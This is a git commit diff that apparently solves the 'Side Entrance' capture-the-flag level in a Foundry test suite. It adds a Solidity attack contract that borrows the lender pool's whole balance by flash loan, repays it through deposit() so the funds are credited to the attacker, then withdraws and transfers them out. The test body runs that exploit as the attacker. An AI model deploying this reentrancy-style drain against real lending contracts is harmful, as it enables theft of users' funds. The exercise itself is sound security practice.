0fc92e190e3faf336d502ef8801668055cf9a250
Jimbo Liao <fong.milk@gmail.com>
2023-06-20 16:52:47 +0800

    break SideEntrance

--- test/Levels/side-entrance/SideEntrance.t.sol
+++ test/Levels/side-entrance/SideEntrance.t.sol
@@ -4,8 +4,28 @@ pragma solidity >=0.8.0;
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
-import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+contract BreakSideEntrance is IFlashLoanEtherReceiver{
+    SideEntranceLenderPool pool;
+    address payable owner;
+    constructor(address _pool){
+        pool = SideEntranceLenderPool(_pool);
+        owner = payable(msg.sender);
+    }
+    // we need receive function to receive ether
+    receive() external payable{}
+    function breakSideEntrance() public {
+        pool.flashLoan(address(pool).balance);
+        // now our balances in pool is equal to the balance of the pool
+        pool.withdraw();
+        owner.transfer(address(this).balance);
+    }
+    function execute() external payable{
+        // flashLoan then deposit to pool
+        pool.deposit{value: address(this).balance}();
+    }
 
+}
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
 
@@ -36,7 +56,10 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        BreakSideEntrance breakSideEntrance = new BreakSideEntrance(address(sideEntranceLenderPool));
+        breakSideEntrance.breakSideEntrance();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
